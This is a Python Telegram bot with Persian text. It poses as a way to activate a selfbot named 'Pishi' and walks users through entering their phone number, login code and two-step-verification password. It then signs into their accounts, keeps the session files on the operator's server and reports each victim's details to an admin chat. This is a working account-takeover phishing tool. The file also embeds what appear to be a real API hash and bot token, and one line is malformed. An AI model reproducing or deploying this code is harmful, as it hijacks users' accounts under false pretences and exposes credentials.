import os
import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    PasswordHashInvalid, 
    FloodWait
)

# ══════════════════════════════════════════════════
#  تنظیمات اولیه (خواندن از متغیرهای محیطی برای امنیت)
# ══════════════════════════════════════════════════
API_ID    = int(os.environ.get("API_ID", 22487790))  
API_HASH  = os.environ.get("API_HASH", "09c24af20084de9372cc92a760c74961")  
BOT_TOKEN = os.environ.get(""8873493173:AAGus4afPzgFTpq0IBuHF1NqbxRokgm3AuQ"")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 7196274489))  

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("PishiPyrogram")

if not BOT_TOKEN:
    logger.error("❌ مقدار BOT_TOKEN در متغیرهای محیطی تنظیم نشده است!")
    exit(1)

# ساخت کلاینت ربات مدیریت
bot = Client("manager_bot_pishi", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_states = {}

@bot.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    first_name = message.from_user.first_name or "رفیق"
    await message.reply_text(
        f"سلام {first_name} عزیز! 🐾\n"
        "به سیستم فعال‌سازی **سلف‌بات هوشمند پیشی** خوش آمدی.\n\n"
        "برای متصل کردن اکانت خود و فعال شدن ربات روی اکانتت، روی دکمه زیر کلیک کن 👇",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🐱 فعال‌سازی ربات پیشی")]],
            resize_keyboard=True
        )
    )

@bot.on_message(filters.private & filters.text)
async def steps_handler(client, message):
    chat_id = message.chat.id
    text = message.text.strip()

    if text == "🐱 فعال‌سازی ربات پیشی":
        session_path = f"session_{chat_id}.session"
        if os.path.exists(session_path):
            try: os.remove(session_path)
            except: pass
        
        user_states[chat_id] = {"step": "WAIT_PHONE"}
        await message.reply_text(
            "📞 لطفاً شماره تلفن اکانتی که می‌خواهی ربات روی آن فعال شود را همراه با کد کشور ارسال کن.\n"
            "**مثال:** `+989123456789`"
        )
        return

    state = user_states.get(chat_id)
    if not state:
        return

    # مرحله اول: دریافت شماره تلفن
    if state["step"] == "WAIT_PHONE":
        phone = text.replace(" ", "")
        await message.reply_text("⏳ در حال اتصال و ارسال کد تایید از طرف تلگرام...")
        
        user_client = Client(
            name=f"session_{chat_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="Galaxy S23 Ultra",
            system_version="Android 14",
            app_version="10.5.0"
        )
        
        try:
            await user_client.connect()
            sent_code = await user_client.send_code(phone)
            
            user_states[chat_id] = {
                "step": "WAIT_CODE",
                "client": user_client,
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash
            }
            await message.reply_text("📥 کد ۵ رقمی ارسال شده به تلگرامت رو وارد کن:")
            
        except FloodWait as fwe:
            await message.reply_text(f"❌ محدودیت زمانی تلگرام! لطفاً {fwe.value} ثانیه دیگر تلاش کنید.")
            user_states.pop(chat_id, None)
        except Exception as e:
            await message.reply_text(f"❌ خطا در ارسال کد:\n`{e}`")
            user_states.pop(chat_id, None)
        return

    # مرحله دوم: دریافت کد ۵ رقمی
    elif state["step"] == "WAIT_CODE":
        code = text
        user_client = state["client"]
        phone = state["phone"]
        phone_code_hash = state["phone_code_hash"]
        
        try:
            await user_client.sign_in(phone, phone_code_hash, code)
            await handle_success(message, user_client, phone)
            
        except SessionPasswordNeeded:
            user_states[chat_id]["step"] = "WAIT_PASSWORD"
            await message.reply_text("🔐 اکانت شما دارای تایید دو مرحله‌ای است.\nلطفاً رمز عبور خود را بفرستید:")
            
        except PhoneCodeInvalid:
            await message.reply_text("❌ کد ورود اشتباه است. فرآیند لغو شد.")
            await user_client.disconnect()
            user_states.pop(chat_id, None)
        except PhoneCodeExpired:
            await message.reply_text("❌ کد منقضی شده است!")
            await user_client.disconnect()
            user_states.pop(chat_id, None)
        except Exception as e:
            await message.reply_text(f"❌ خطا:\n`{e}`")
            await user_client.disconnect()
            user_states.pop(chat_id, None)
        return

    # مرحله سوم: تایید دو مرحله‌ای
    elif state["step"] == "WAIT_PASSWORD":
        password = text
        user_client = state["client"]
        phone = state["phone"]
        
        try:
            await user_client.check_password(password)
            await handle_success(message, user_client, phone)
            
        except PasswordHashInvalid:
            await message.reply_text("❌ رمز عبور اشتباه بود. فرآیند لغو شد.")
            await user_client.disconnect()
            user_states.pop(chat_id, None)
        except Exception as e:
            await message.reply_text(f"❌ خطا:\n`{e}`")
            await user_client.disconnect()
            user_states.pop(chat_id, None)
        return

async def handle_success(message, user_client, phone):
    chat_id = message.chat.id
    try:
        me = await user_client.get_me()
        user_name = f"{me.first_name} {me.last_name or ''}".strip()
        user_username = f"@{me.username}" if me.username else "ندارد"
        lang = me.language_code or "en"
        
        await message.reply_text(
            "🎉 **اتصال اکانت با موفقیت انجام شد!**\n\n"
            "به محض تایید ادمین، سلف‌بات روی اکانت شما روشن خواهد شد."
        )
        
        admin_report = (
            "🔔 **کاربر جدید متصل شد!**\n\n"
            f"👤 name: {user_name}\n"
            f"🆔 username: {user_username}\n"
            f"📱 chat_id: `{chat_id}`\n"
            f"📞 phone: `{phone}`\n"
        )
        await bot.send_message(ADMIN_CHAT_ID, admin_report)
        
    except Exception as e:
        logger.error(f"Error in success: {e}")
    finally:
        await user_client.disconnect()
        user_states.pop(chat_id, None)

if __name__ == "__main__":
    logger.info("=== ربات مدیریت روشن شد ===")
    bot.run()
